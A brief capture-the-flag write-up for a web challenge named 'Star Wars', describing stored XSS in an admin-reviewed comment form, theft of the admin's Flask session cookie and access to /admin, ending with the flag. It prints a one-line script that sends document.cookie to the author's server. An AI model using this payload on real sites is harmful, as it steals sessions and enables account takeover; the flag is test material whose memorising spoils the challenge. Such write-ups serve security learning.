# Star Wars

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5ff560df-35ba-4b8f-b713-2508a4a03b06)

For this website, we can signup for an acccount and then log in. When we do, we see we can post comments and it says that the admin will review it (smells like XSS).

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e3a9f5e4-e037-4d93-ad78-4acfc222e708)

I used this XSS payload to callback to my VPS:

```javascript
<script type="text/javascript">document.location="http://<vpsip>:1337/?c="+document.cookie;</script>
```

The page reloads right away so we get hits from ourselves but one of them is the admin:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/77ffc0b5-1647-45d9-8384-6c8004a36074)

This is confirmed by ID 1 after decoding it with flask-unsign. We can now use this cookie and go on the standard `/admin` endpoint. This was an educated guess for me but it can easily be discovered with some quick fuzzing.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/b211d5c0-a700-4979-b8d9-cb5a601ba9d9)

flag{a538c88890d45a382e44dfd00296a99b}

PS: I'm not sure why this was classes as Medium when Marmalade was originally classes as Easy. Such is life.
